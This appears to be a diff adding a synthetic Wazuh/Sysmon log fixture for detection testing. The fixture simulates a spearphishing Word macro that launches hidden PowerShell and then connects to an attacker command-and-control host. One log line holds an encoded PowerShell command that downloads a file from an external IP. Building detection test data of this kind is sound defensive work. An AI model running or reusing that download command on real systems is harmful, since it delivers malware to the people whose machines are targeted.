@@ -1,0 +1,129 @@
+{
+  "_metadata": {
+    "attack_id": "T1566.001",
+    "variation": "003",
+    "name": "Spearphishing Attachment - Macro-enabled Document",
+    "description": "User opens weaponized Word document from email attachment, macro executes PowerShell payload",
+    "expected_detection": "MEDIUM",
+    "kill_chain_phase": "initial-access",
+    "format": "wazuh-native",
+    "format_version": "1.0",
+    "campaign": "31",
+    "batch": "12"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - WINWORD.EXE spawning PowerShell from macro",
+      "sequence": 1,
+      "timestamp": "2026-02-10T21:00:00.000Z",
+      "log": {
+        "timestamp": "2026-02-10T21:00:00.000Z",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: Office Application Spawning PowerShell",
+          "id": "100100",
+          "mitre": {
+            "id": ["T1566.001", "T1059.001"],
+            "tactic": ["Initial Access", "Execution"],
+            "technique": ["Spearphishing Attachment", "PowerShell"]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": ["sysmon", "sysmon_event1", "windows", "attack"]
+        },
+        "agent": {"id": "014", "name": "WS01", "ip": "10.1.0.20"},
+        "manager": {"name": "wazuh.manager"},
+        "id": "1710000001.000001",
+        "decoder": {"name": "windows_eventchannel"},
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.yourcompany.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-10 21:00:00.000",
+              "processGuid": "{a23d45b8-c8f2-65e7-1234-000000001100}",
+              "processId": "4532",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAIAAkAGMAbABpAGUAbgB0AC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQA",
+              "currentDirectory": "C:\\Users\\analyst\\AppData\\Local\\Temp\\",
+              "user": "YOURCOMPANY\\analyst",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855",
+              "parentProcessGuid": "{a23d45b8-c8f2-65e7-1234-000000001000}",
+              "parentProcessId": "3844",
+              "parentImage": "C:\\Program Files\\Microsoft Office\\Root\\Office16\\WINWORD.EXE",
+              "parentCommandLine": "\"C:\\Program Files\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\analyst\\Downloads\\Invoice_Feb2026.docm\""
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "fomorian_campaign": 31,
+        "fomorian_batch": 12
+      }
+    },
+    {
+      "_comment": "Sysmon Event 3 - PowerShell establishing outbound connection to attacker C2",
+      "sequence": 2,
+      "timestamp": "2026-02-10T21:00:15.000Z",
+      "log": {
+        "timestamp": "2026-02-10T21:00:15.000Z",
+        "rule": {
+          "level": 10,
+          "description": "Sysmon - Event 3: PowerShell Outbound Network Connection",
+          "id": "100103",
+          "mitre": {
+            "id": ["T1071.001"],
+            "tactic": ["Command and Control"],
+            "technique": ["Web Protocols"]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": ["sysmon", "sysmon_event3", "windows"]
+        },
+        "agent": {"id": "014", "name": "WS01", "ip": "10.1.0.20"},
+        "manager": {"name": "wazuh.manager"},
+        "id": "1710000001.000002",
+        "decoder": {"name": "windows_eventchannel"},
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "3",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.yourcompany.local",
+              "level": "4",
+              "task": "3",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-10 21:00:15.000",
+              "processGuid": "{a23d45b8-c8f2-65e7-1234-000000001100}",
+              "processId": "4532",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "user": "YOURCOMPANY\\analyst",
+              "protocol": "tcp",
+              "initiated": "true",
+              "sourceIp": "10.1.0.20",
+              "sourcePort": "49823",
+              "destinationIp": "185.220.101.50",
+              "destinationPort": "443",
+              "destinationHostname": "attacker-c2.onion.to"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "fomorian_campaign": 31,
+        "fomorian_batch": 12
+      }
+    }
+  ]
+}
